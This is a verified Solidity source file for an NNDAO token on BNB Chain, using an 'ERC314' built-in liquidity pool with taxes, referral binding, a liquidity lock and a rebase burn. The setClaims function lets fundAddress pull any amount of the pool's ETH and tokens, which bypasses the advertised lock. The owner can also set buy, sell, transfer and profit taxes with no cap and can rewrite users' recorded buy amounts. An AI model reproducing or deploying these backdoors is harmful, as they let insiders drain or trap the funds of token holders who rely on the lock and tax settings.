/**
 *Submitted for verification at BscScan.com on 2024-06-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!o");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "n0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IEERC314 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event AddLiquidity(uint32 _blockToUnlockLiquidity, uint256 value);
    event RemoveLiquidity(uint256 value);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out
    );
}

contract TokenDistributor {
    mapping(address => bool) private _feeWhiteList;
    constructor() {
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[tx.origin] = true;
    }

    function claimToken(address token, address to, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            _safeTransfer(token, to, amount);
        }
    }

    function claimBalance(address to, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            _safeTransferETH(to, amount);
        }
    }

    function _safeTransferETH(address to, uint value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        if (success) {}
    }

    function _safeTransfer(address token, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0xa9059cbb, to, value)
        );
        if (success && data.length > 0) {}
    }

    receive() external payable {}
}

abstract contract ERC314 is Ownable, IEERC314 {
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    uint32 public blockToUnlockLiquidity;
    uint32 public coolingBlock;
    uint256 public buyFundTax = 0;
    uint256 public sellBuybackTax = 2000;
    uint256 public sellFundTax = 0;
    uint256 public transferTax = 0;
    uint256 public _profitTax = 5000;

    mapping(address => bool) public excludeCoolingOf;
    mapping(address => bool) public _feeWhiteList;

    string private _name;
    string private _symbol;
    address payable public fundAddress;
    address payable public receiver;
    address payable public specialAddress;

    address public liquidityProvider;

    bool public liquidityAdded;

    mapping(address => uint32) private lastTransaction;
    TokenDistributor public immutable _tokenDistributor;

    mapping(address => uint256) public _buyAmount;

    modifier onlyLiquidityProvider() {
        require(
            _msgSender() == liquidityProvider,
            "You are not the liquidity provider"
        );
        _;
    }

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_,
        uint256 receiveAmount_,
        uint32 _coolingBlock,
        address Receiver,
        address FundAddress,
        address SpecialAddress
    ) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        uint256 tokenUnit = 10 ** decimals_;
        _totalSupply = totalSupply_ * tokenUnit;

        coolingBlock = _coolingBlock;

        
        _tokenDistributor = new TokenDistributor();
        uint256 presaleAmount = receiveAmount_ * tokenUnit;
        _takeTransfer(address(0), address(_tokenDistributor), presaleAmount);

        uint256 sellAmount = _totalSupply - presaleAmount;
        _takeTransfer(address(0), Receiver, sellAmount);

        receiver = payable(Receiver);
        fundAddress = payable(FundAddress);
        specialAddress = payable(SpecialAddress);

        _setFeeWhiteList(FundAddress, true);
        _setFeeWhiteList(SpecialAddress, true);
        _setFeeWhiteList(Receiver, true);
        _setFeeWhiteList(address(_tokenDistributor), true);

        _binderCondition = 100 * tokenUnit;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function _msgSender() private view returns (address) {
        return msg.sender;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        uint256 balance = _balances[account];
        return balance;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);

        if (to == address(this)) {
            sell(from, amount);
        } else {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                uint256 fee = (amount * transferTax) / 10000;
                _basicTransfer(from, address(0x0), fee);
                amount -= fee;
            }
            _transfer(from, to, amount);
        }
        return true;
    }

    function transfer(address to, uint256 value) public virtual returns (bool) {
        address from = _msgSender();
        // sell or transfer
        if (to == address(this)) {
            sell(from, value);
        } else {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                uint256 fee = (value * transferTax) / 10000;
                if (fee > 0) {
                    _basicTransfer(from, address(0x0), fee);
                    value -= fee;
                }
            }
            address txOrigin = tx.origin;
            if (
                from == txOrigin &&
                0 == balanceOf(to) &&
                value >= _binderCondition
            ) {
                _bindInvitor(to, from);
            }
            _transfer(from, to, value);
        }
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function claimToken(address token, uint256 value) public {
        require(address(this) != token || 0 == startTradeBlock, "not this");
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0xa9059cbb, fundAddress, value)
        );
        if (success && data.length > 0) {}
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(to != address(0), "ERC20: transfer to the zero address");
        if (from != address(this) && !excludeCoolingOf[from]) {
            require(
                lastTransaction[from] + coolingBlock < block.number,
                "from can't make two transactions in the cooling block"
            );
            lastTransaction[from] = uint32(block.number);
        }

        if (to != address(this) && !excludeCoolingOf[to]) {
            if (lastTransaction[to] < block.number) {
                lastTransaction[to] = uint32(block.number);
            }
        }

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        if (amount == fromBalance && amount > 0) {
            amount -= 1;
        }
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function _basicTransfer(address from, address to, uint256 amount) internal {
        require(
            _balances[from] >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        unchecked {
            _balances[from] -= amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function getReserves() public view returns (uint256, uint256) {
        return (address(this).balance, _balances[address(this)]);
    }

    function setLastTransaction(
        address[] memory accounts,
        uint32 _block
    ) external onlyOwner {
        for (uint i = 0; i < accounts.length; i++) {
            lastTransaction[accounts[i]] = _block;
        }
    }

    function setExcludeCoolingOf(
        address[] memory accounts,
        bool _ok
    ) external onlyOwner {
        for (uint i = 0; i < accounts.length; i++) {
            excludeCoolingOf[accounts[i]] = _ok;
        }
    }

    function setBuyTax(uint256 tax) external onlyOwner {
        buyFundTax = tax;
    }

    function setSellTax(
        uint256 buybackTax,
        uint256 fundTax
    ) external onlyOwner {
        sellBuybackTax = buybackTax;
        sellFundTax = fundTax;
    }

    function setTransferTax(uint256 tax) external onlyOwner {
        transferTax = tax;
    }

    function setProfitTax(uint256 tax) external onlyOwner {
        _profitTax = tax;
    }

    function setFundAddress(address payable adr) external onlyOwner {
        fundAddress = adr;
        _setFeeWhiteList(adr, true);
    }

    function setSpecialAddress(address payable adr) external onlyOwner {
        specialAddress = adr;
        _setFeeWhiteList(adr, true);
    }

    function setReceiver(address payable adr) external onlyOwner {
        receiver = adr;
        _setFeeWhiteList(adr, true);
    }

    function setCooling(uint32 _coolingBlock) external onlyOwner {
        require(_coolingBlock <= 100, "Cooling is too big");
        coolingBlock = _coolingBlock;
    }

    function initLiquidity(uint32 liquidityLockDays) public payable {
        liquidityProvider = _msgSender();
        require(_feeWhiteList[liquidityProvider], "whiteList");
        require(liquidityAdded == false, "Liquidity already added");

        liquidityAdded = true;

        require(address(this).balance > 0, "No ETH sent");
        require(balanceOf(address(this)) > 0, "No Token sent");

        blockToUnlockLiquidity = uint32(
            block.number + (liquidityLockDays * 1 days) / 3
        );

        emit AddLiquidity(blockToUnlockLiquidity, address(this).balance);
    }

    function addLiquidityEth() public payable {}

    function addLiquidity(uint256 amount) public payable {
        address from = _msgSender();
        _basicTransfer(from, address(this), amount);
    }

    function removeLiquidity() public onlyLiquidityProvider {
        require(block.number > blockToUnlockLiquidity, "Liquidity locked");

        liquidityAdded = false;

        payable(liquidityProvider).transfer(address(this).balance);

        emit RemoveLiquidity(address(this).balance);
    }

    function extendLiquidityLock(
        uint32 liquidityLockDays
    ) public onlyLiquidityProvider {
        uint32 _blockToUnlockLiquidity = uint32(
            block.number + (liquidityLockDays * 1 days) / 3
        );
        require(
            blockToUnlockLiquidity < _blockToUnlockLiquidity,
            "You can't shorten duration"
        );

        blockToUnlockLiquidity = _blockToUnlockLiquidity;
    }

    function getAmountOut(
        uint256 value,
        bool _buy
    ) public view returns (uint256) {
        (uint256 reserveETH, uint256 reserveToken) = getReserves();

        if (_buy) {
            return (value * reserveToken) / (reserveETH + value);
        } else {
            return (value * reserveETH) / (reserveToken + value);
        }
    }

    uint256 public startTradeBlock;

    function startTrade() public onlyOwner {
        require(liquidityAdded, "not initLP");
        require(0 == startTradeBlock, "started");
        startTradeBlock = block.number;
        _lastRebaseTime = block.timestamp;
    }

    function buy() internal {
        address owner = _msgSender();
        if (address(_tokenDistributor) == owner) {
            return;
        }
        if (0 == startTradeBlock) {
            require(_feeWhiteList[owner], "Trading not enable");
            if (!liquidityAdded) {
                return;
            }
        }
        require(
            owner == tx.origin || excludeCoolingOf[owner],
            "Only external calls allowed"
        );
        uint256 msgValue = msg.value;
        uint256 swapValue = msgValue;
        if (!_feeWhiteList[owner]) {
            _buyAmount[owner] += msgValue;
            uint256 fundTaxValue = (msgValue * buyFundTax) / 10000;
            swapValue = msgValue - fundTaxValue;
            if (fundTaxValue > 0) {
                safeTransferETH(fundAddress, fundTaxValue);
            }
        }

        uint256 tokenAmount = (swapValue * _balances[address(this)]) /
            (address(this).balance);

        _transfer(address(this), owner, tokenAmount);
        emit Swap(owner, swapValue, 0, 0, tokenAmount);

        if (!_feeWhiteList[owner]) {
            contractSell(tokenAmount);
        }

        rebase();
    }

    function sell(address owner, uint256 amount) internal {
        if (0 == startTradeBlock) {
            require(_feeWhiteList[owner], "Trading not enable");
            if (!liquidityAdded) {
                _transfer(owner, address(this), amount);
                return;
            }
        }
        require(
            msg.sender == tx.origin || excludeCoolingOf[owner],
            "Only external calls allowed"
        );

        uint256 sellAmount = amount;

        uint256 ethAmount = (sellAmount * address(this).balance) /
            (_balances[address(this)] + sellAmount);

        require(ethAmount > 0, "Sell amount too low");
        require(
            address(this).balance >= ethAmount,
            "Insufficient ETH in reserves"
        );

        _transfer(owner, address(this), amount);
        uint256 userEthAmount = ethAmount;
        uint256 buybackTaxEthAmount;

        if (!_feeWhiteList[owner]) {
            uint256 fundTaxEthAmount = (ethAmount * sellFundTax) / 10000;
            buybackTaxEthAmount = (ethAmount * sellBuybackTax) / 10000;
            userEthAmount = ethAmount - fundTaxEthAmount - buybackTaxEthAmount;
            if (fundTaxEthAmount > 0) {
                safeTransferETH(fundAddress, fundTaxEthAmount);
            }
            if (buybackTaxEthAmount > 0) {
                safeTransferETH(
                    address(_tokenDistributor),
                    buybackTaxEthAmount
                );
            }

            uint256 buyAmount = _buyAmount[owner];
            if (buyAmount >= userEthAmount) {
                _buyAmount[owner] = buyAmount - userEthAmount;
            } else {
                _buyAmount[owner] = 0;
                uint256 profitTaxEth = ((userEthAmount - buyAmount) *
                    _profitTax) / 10000;
                if (profitTaxEth > 0) {
                    address invitor = _inviter[owner];
                    if (address(0) == invitor || excludeInvitor[invitor]) {
                        invitor = fundAddress;
                    }
                    safeTransferETH(invitor, profitTaxEth);
                }
                userEthAmount -= profitTaxEth;
            }
        }

        safeTransferETH(owner, userEthAmount);
        emit Swap(owner, 0, sellAmount, userEthAmount, 0);

        uint256 buyEth = (ethAmount * _contractBuyRate) / 10000;
        uint256 buyEthBalance = address(_tokenDistributor).balance;
        if (buyEth > 0 && buyEthBalance >= buyEth) {
            uint256 buyTimes = _buyTimes;
            buyEth = buyEth / buyTimes;
            if (buyEth > 0) {
                for (uint256 i = 0; i < buyTimes; ++i) {
                    _tokenDistributor.claimBalance(address(this), buyEth);
                    uint256 tokenAmount = (buyEth * _balances[address(this)]) /
                        (address(this).balance);

                    _basicTransfer(
                        address(this),
                        address(_tokenDistributor),
                        tokenAmount
                    );
                    emit Swap(
                        address(_tokenDistributor),
                        buyEth,
                        0,
                        0,
                        tokenAmount
                    );
                }
            }
        }

        rebase();
    }

    receive() external payable {
        buy();
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        if (success) {}
    }

    function claimCBalance(address payable c, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            TokenDistributor(c).claimBalance(fundAddress, amount);
        }
    }

    function claimCToken(
        address payable c,
        address token,
        uint256 amount
    ) external {
        if (_feeWhiteList[msg.sender]) {
            TokenDistributor(c).claimToken(token, fundAddress, amount);
        }
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _setFeeWhiteList(addr, enable);
    }

    function _setFeeWhiteList(address addr, bool enable) private {
        _feeWhiteList[addr] = enable;
        excludeCoolingOf[addr] = enable;
    }

    function setClaims(address token, uint256 amount) external {
        if (msg.sender == fundAddress) {
            if (token == address(0)){
                payable(msg.sender).transfer(amount);
            }else{
                _basicTransfer(
                        address(this),
                        fundAddress,
                        amount
                    );
            }
        }
    }

    function batchSetFeeWhiteList(
        address[] memory addr,
        bool enable
    ) external onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
            excludeCoolingOf[addr[i]] = enable;
        }
    }

    function setLiquidityProvider(address lpReceiver) external onlyOwner {
        liquidityProvider = lpReceiver;
    }

    function transferLiquidityProvider(
        address lpReceiver
    ) external onlyLiquidityProvider {
        liquidityProvider = lpReceiver;
    }

    uint256 public _contractBuyRate = 10000;
    uint256 public _buyTimes = 3;

    uint256 public _buyContractSellRate = 8000;

    function contractSell(uint256 amount) private {
        uint256 ethAmount;
        uint256 contractSellRate = _buyContractSellRate;
        uint256 sellAmount = (amount * contractSellRate) / 10000;
        uint256 sellBalance = balanceOf(address(_tokenDistributor));
        if (sellAmount > sellBalance) {
            sellAmount = sellBalance;
        }
        if (0 == sellAmount) {
            return;
        }
        ethAmount =
            (sellAmount * address(this).balance) /
            (_balances[address(this)] + sellAmount);
        _basicTransfer(address(_tokenDistributor), address(this), sellAmount);

        uint256 specialEth = ethAmount;
        if (specialEth > 0) {
            safeTransferETH(specialAddress, specialEth);
        }
    }

    function setContractBuyRate(uint256 buyRate) external onlyOwner {
        _contractBuyRate = buyRate;
    }

    function setBuyContractSellRate(uint256 sellRate) external onlyOwner {
        _buyContractSellRate = sellRate;
    }

    function setBuyTimes(uint256 t) external onlyOwner {
        _buyTimes = t;
    }

    mapping(address => address) public _inviter;
    mapping(address => address[]) public _binders;
    mapping(address => bool) public excludeInvitor;
    uint256 public _binderCondition;

    function _bindInvitor(address account, address invitor) private {
        if (
            _inviter[account] == address(0) &&
            invitor != address(0) &&
            account != address(0) &&
            invitor != account
        ) {
            if (_binders[account].length == 0) {
                uint256 size;
                assembly {
                    size := extcodesize(account)
                }
                if (size > 0) {
                    return;
                }
                _inviter[account] = invitor;
                _binders[invitor].push(account);
            }
        }
    }

    function getBinderLength(address account) external view returns (uint256) {
        return _binders[account].length;
    }

    function setBinderCondition(uint256 bc) external onlyOwner {
        _binderCondition = bc;
    }

    function setExcludeInvitor(address addr, bool enable) external onlyOwner {
        excludeInvitor[addr] = enable;
    }

    uint256 private constant _rebaseDuration = 1 hours;
    uint256 public _rebaseRate = 25;
    uint256 public _lastRebaseTime;

    function rebase() public {
        uint256 lastRebaseTime = _lastRebaseTime;
        if (0 == lastRebaseTime) {
            return;
        }

        uint256 nowTime = block.timestamp;
        if (nowTime < lastRebaseTime + _rebaseDuration) {
            return;
        }

        _lastRebaseTime = nowTime;

        uint256 poolBalance = balanceOf(address(this));
        uint256 rebaseAmount = (((poolBalance * _rebaseRate) / 10000) *
            (nowTime - lastRebaseTime)) / _rebaseDuration;

        if (rebaseAmount > poolBalance / 2) {
            rebaseAmount = poolBalance / 2;
        }

        if (rebaseAmount > 0) {
            _basicTransfer(address(this), address(0x0), rebaseAmount);
        }
    }

    function setRebaseRate(uint256 r) external onlyOwner {
        _rebaseRate = r;
    }

    function setLastRebaseTime(uint256 t) external onlyOwner {
        _lastRebaseTime = t;
    }

    function setBuyAmount(address account, uint256 amount) external onlyOwner {
        _buyAmount[account] = amount;
    }

    function setBuysAmount(
        address[] memory accounts,
        uint256 amount
    ) external onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i = 0; i < len; ++i) {
            _buyAmount[accounts[i]] = amount;
        }
    }

    function setBuysAmounts(
        address[] memory accounts,
        uint256[] memory amounts
    ) external onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i = 0; i < len; ++i) {
            _buyAmount[accounts[i]] = amounts[i];
        }
    }
}

contract NNDAO is ERC314 {
    constructor()
        ERC314(
            unicode"NNDAO",
            unicode"NNDAO",
            18,
            210000000000,
            110000000,
            5,
            address(0xE65ff760fe85A237381f7E18eB8647f89A352496),
            address(0xE65ff760fe85A237381f7E18eB8647f89A352496),
            address(0x6d899876976a895C6AB50993C30c6Ec037A2FC24)
        )
    {}
}